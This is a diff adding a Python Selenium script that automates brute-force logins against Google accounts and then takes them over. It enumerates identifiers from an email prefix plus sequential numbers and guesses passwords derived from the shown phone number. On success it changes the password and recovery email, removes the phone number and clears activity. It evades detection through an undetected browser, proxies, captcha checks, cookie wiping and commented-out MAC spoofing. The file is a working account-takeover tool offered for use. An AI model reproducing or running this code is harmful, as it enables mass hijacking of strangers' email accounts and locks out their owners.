@@ -1,0 +1,353 @@
+# from pynput.mouse import Button, Controller
+import os
+from selenium.webdriver.common.keys import Keys
+from ps_lib.post import post
+from ps_lib.ps_setup import table
+from ps_lib.helper import helper
+from ps_lib.accounts import accounts
+from ps_lib.uc import ucbrowser
+from datetime import datetime
+from os import path
+import sys
+import shutil
+import random
+import time
+# import subprocess
+# subprocess.call(["python", "-m", 'pip', "install", "requests"])
+# subprocess.call(["python", "-m", 'pip', "install", "imapclient"])
+# subprocess.call(["python", "-m", 'pip', "install", "python_anticaptcha"])
+# subprocess.call(["python", "-m", 'pip', "install", "chardet"])
+# subprocess.call(["python", "-m", 'pip', "install", "pyvirtualdisplay"])
+
+# from pyvirtualdisplay import Display
+
+abspath = os.path.abspath(__file__)
+dname = os.path.dirname(abspath)
+os.chdir(dname)
+bundle_dir = path.abspath(path.dirname(__file__))
+os.path.dirname(os.path.abspath(__file__))
+
+
+def main(account_data):
+    # work start time
+    starttime = datetime.now().strftime("%H:%M:%S")
+
+    print(datetime.now().strftime("%H:%M:%S"))
+    print(account_data)
+    account_id = account_data['id']
+    worker_acc = accounts()
+    use_proxy = True
+
+    # b = browser(account_id, pva=account_data)
+    # b = firefoxBrowser(account_id, pva=account_data)
+    b = ucbrowser(account_id, pva=account_data)
+    time.sleep(5)
+
+    # if b.PROXY_PASS == False and b.use_proxy == True:
+    #     b.exit()
+    #     print('proxy condition not fulfilled')
+    #     # worker_acc.ban_3(account_id, 5)
+    #     time.sleep(10)
+    #     return False
+
+    try:
+        loginurl = 'https://accounts.google.com/signin/v2/identifier'
+
+        b.get_url(loginurl)
+        # b.get_url('https://accounts.google.com/signup/v2/webcreateaccount?service=mail&biz=false&flowName=GlifWebSignIn&flowEntry=SignUp')
+    except:
+        b.exit()
+    # time.sleep(120)
+
+    count = 0
+    one_token = account_data['password']
+    for no in range(int(account_data['extra']), int(account_data['extra'])+5000):
+        time.sleep(1)
+        print(account_data['password'])
+        account_data = worker_acc.get_account(
+            one_token=one_token)
+        print(account_data)
+        finalacc = None
+
+        # rejeted
+        # https://accounts.google.com/signin/v2/deniedsigninrejected
+        # https://accounts.google.com/v3/signin/rejected
+        # https://myaccount.google.com/?utm_source=OGB&tab=mk&utm_medium=app
+        # login page
+        # india
+
+        loginurl = 'https://accounts.google.com/AccountChooser/signinchooser'
+        # password page
+        # https://accounts.google.com/signin/v2/challenge/pwd
+        count = count+1
+        # print(count)
+        if count % 20 == 1:
+            pass
+            # worker_acc.update_account(data=str(account_data), id=account_data['id'])
+            # b.get_url(loginurl)
+
+        continueyes = False
+        print('no:', str(no))
+        # b.get_screenshot(str(no)+'.png')
+
+        for passwordtype in [3, 2, 1]:
+            if 'challenge/pwd' in b.current_url():
+                mailpass = str(no)
+
+                try:
+                    password = b.visibil_element(
+                        'xpath', '//input[@name="Passwd"]', wait=120)
+                    mailpass = b.visibil_element(
+                        'xpath', '//div[@data-profile-identifier]', wait=120)
+                    trypass = mailpass.text.replace("-", "")  # mailpass
+                    savenumber = ''.join(e for e in trypass if e.isalnum())
+                    # b.get_screenshot(str(trypass)+'-type-'+str(passwordtype)+'.png')
+
+                    if trypass.startswith('0'):
+                        if account_data['post_data'] == 'yes':
+                            trypass = trypass[1:]
+                    mailpass = ''.join(e for e in trypass if e.isalnum())
+                    if passwordtype == 1:
+                        mailpass = mailpass
+                    if passwordtype == 2:
+                        mailpass = mailpass[2:]
+                    if passwordtype == 3:
+                        mailpass = mailpass[:-2]
+                    print('try : ', trypass, mailpass)
+                    # try:
+                    #     imgcapch = b.visibil_element(
+                    #         'id', "captchaimg", wait=1)
+
+                    #     if imgcapch.get_attribute('src'):
+                    #         print('imgcapch')
+                    #         continueyes = True
+                    #         break
+                    # except Exception as e:
+                    #     print(e)
+                    #     pass
+                    # print(passwordtype, mailpass)
+                    password.clear()
+                    password.send_keys(mailpass)
+                    # time.sleep(5)
+
+                    passwordNext = b.visibil_element(
+                        'css', '[id="passwordNext"] button')
+
+                    passwordNext.click()
+                    # print(b.driver.requests)
+                    # print(datetime.now())
+                    time.sleep(2)
+                    # print(datetime.now())
+
+                    # if b.visibil_element('xpath', '//*[@width="16px"][@height="16px"]', wait=10):
+                    if b.visibil_element('xpath', '//input[@name="Passwd"]', wait=2):
+                        # worker_acc.save_account(data=mailpass, soft_token=account_data['password'])
+                        # print('not match: {0}'.format(mailpass))
+                        if passwordtype == 1:
+                            continueyes = True
+                            break
+
+                    else:
+                        print('match: {0}'.format(mailpass))
+                        # b.get_screenshot(str(mailpass)+'-match-type-'+str(passwordtype)+'.png')
+                        fullnumber = account_data['email']+str(savenumber)
+                        finalacc = worker_acc.save_account(password=mailpass,
+                                                           data=fullnumber, soft_token=account_data['password'])
+                        # worker_acc.update_account(
+                        #     data=str(no), id=account_data['id'])
+                        print('..........start full work.............')
+                        print('final acc ', finalacc)
+                        all = finalacc
+
+                        id = finalacc['id']
+                        email_address = finalacc['email']
+                        email_address = str(email_address)
+                        email_pass = finalacc['password']
+                        recovery_email = finalacc['password']
+                        new_pass = b.account.ran_password()
+                        recovery_email_new = b.account.recovery_return(
+                            recovery_email)
+                        send_keys = True
+                        print("number or email: ", email_address)
+                        login_value = b.gmail_login(id)
+                        if login_value == True:
+                            chengePassRq = b.req_change_password(id)
+                            # print('mail_status', login_value)
+                            # bell = visibil_element(
+                            #     driver, 'xpath', ("//img"), 2)
+                            # if bell:
+                            #     gmail_fail_update(5, id)
+                            #     continue
+
+                            b.driver.implicitly_wait(10)
+                            email_address = b.language_cng(id, email_pass)
+                            print('new rec:', recovery_email_new)
+                            b.update_recovery(recovery_email_new, id)
+                            if chengePassRq == False:
+                                b.change_password(new_pass, id)
+                            b.remove_number(id)
+                            b.device_activity()
+
+                            b.find_time(id)
+                            b.activity_login()
+
+                            b.account.gmail_update(id)
+                        else:
+                            print(login_value)
+
+                        try:
+                            # print('not login')
+                            b.driver.delete_all_cookies()
+                            # driver.close()
+                        except Exception as e:
+                            print(e)
+                            pass
+                        print('..........end full varsision work.............')
+                        continueyes = True
+                        break
+                except Exception as e:
+                    print(e)
+                    print(b.current_url())
+
+                    print('passwordNext')
+                    b.get_url(loginurl)
+                    continueyes = True
+                    break
+        # password checking work done
+        try:
+            imgcapch = b.visibil_element(
+                'id', "captchaimg", wait=1)
+
+            if imgcapch.get_attribute('src'):
+                b.get_url(loginurl)
+                continue
+        except Exception as e:
+            # print(e)
+            pass
+        if continueyes:
+            b.get_url(loginurl)
+            continue
+
+        if 'signinrejecte' in b.current_url():
+
+            b.get_url(loginurl)
+        if 'challenge/recaptcha' in b.current_url():
+
+            b.get_url(loginurl)
+        if 'signin/rejected' in b.current_url():
+            b.driver.delete_all_cookies()
+
+            b.get_url(loginurl)
+        if 'myaccount.google' in b.current_url():
+            b.driver.delete_all_cookies()
+
+            b.get_url(loginurl)
+        if 'challenge/dp' in b.current_url():
+            b.driver.delete_all_cookies()
+
+            b.get_url(loginurl)
+        if 'signinchooser' in b.current_url():
+            b.driver.delete_all_cookies()
+
+            b.get_url(loginurl)
+        if 'unknownerror' in b.current_url():
+            b.driver.delete_all_cookies()
+
+            b.get_url(loginurl)
+        if 'challenge/selection' in b.current_url():
+            b.driver.delete_all_cookies()
+
+            b.get_url(loginurl)
+        if 'challenge/iap' in b.current_url():
+            b.driver.delete_all_cookies()
+
+            b.get_url(loginurl)
+        if 'speedbump/changepassword' in b.current_url():
+            b.driver.delete_all_cookies()
+
+            b.get_url(loginurl)
+        if 'identifier' in b.current_url():
+            # print('identifier')
+
+            # time.sleep(60)
+            try:
+
+                email = b.visibil_element('name', "identifier")
+                email.clear()
+                email.send_keys(account_data['email'])
+
+                email.send_keys(no)
+            except:
+                b.get_url(loginurl)
+                continue
+
+        try:
+            nextpage = b.visibil_element(
+                'css', '#identifierNext button', wait=1)
+            nextpage.click()
+            b.driver.implicitly_wait(25)
+        except:
+            continue
+
+    # b.ipinfo_save(software_name='gmail checker')
+
+    b.exit()
+    print('browser close')
+
+    print('start :', starttime)
+    print('end :', datetime.now().strftime("%H:%M:%S"))
+
+
+setup = table()
+setup.token_verify()
+# setup.pop_verify()
+
+# w = int(input('how much worker you need? '))
+# packages_id = input('proxy info by a line : ')
+packages_id = '317345'
+
+# worker = w + 1
+worker = 2
+# ........................start worker....................
+# open('active.txt', "w+")
+utility = helper()
+headers = {}
+profile_ids = {}
+acc = accounts()
+# print(acc.get_proxy_list())
+# exit()
+post = post()
+if sys.platform not in ['Windows', 'win32', 'cygwin']:
+    # display = Display(visible=0, size=(1024, 768))
+    pass
+    # display.start()
+    pass
+# x = threading.Thread(target=smtp.reply_check, args=(1,), daemon=True)
+# x.start()
+while True:
+
+    # subprocess.call(["sudo", "ifconfig", "ens33", "down"])
+    # subprocess.call(["sudo", "ifconfig", "ens33", "hw",
+    #                 "ether", "00:11:22:33:44:55"])
+    # subprocess.call(["sudo", "ifconfig", "ens33", "up"])
+    # utility.network_check()
+    if setup.token_off():
+        print('software off now')
+        time.sleep(60)
+        continue
+    one_account = acc.get_account()
+
+    postinfo = post.get_post()
+    body_mail = None
+    if one_account == None or postinfo == None:
+        print('post or account not find for worker')
+        time.sleep(60)
+        continue
+    print('account id : ', one_account['id'])
+
+    if path.isdir('profiles/' + str(one_account['id'])) == True:
+        shutil.rmtree('profiles/' + str(one_account['id']))
+
+    print('main')
+    main(one_account)
+    time.sleep(1)
